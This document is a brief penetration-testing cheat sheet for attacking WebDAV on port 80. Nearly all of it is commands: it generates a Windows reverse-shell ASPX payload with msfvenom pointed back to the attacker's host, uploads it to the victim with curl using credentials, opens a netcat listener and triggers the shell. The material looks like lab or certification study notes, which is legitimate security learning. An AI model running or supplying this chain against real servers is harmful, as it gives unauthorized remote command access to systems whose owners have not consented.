# WebDAV

Port 80

### 1) Connection

    cadaver IP

### 2) Exploitation

#### 1. Generate a reverse shell

    msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=80 -f aspx -o shell.aspx

#### 2. Upload payload via WebDAV

    curl -T 'shell.aspx' 'http://$VictimIP/' -u <username>:<password>

#### 3. Start the listener

    nc -lvnp 80

#### 4. Trigger the payload

    curl http://$VictimIP/shell.aspx
    

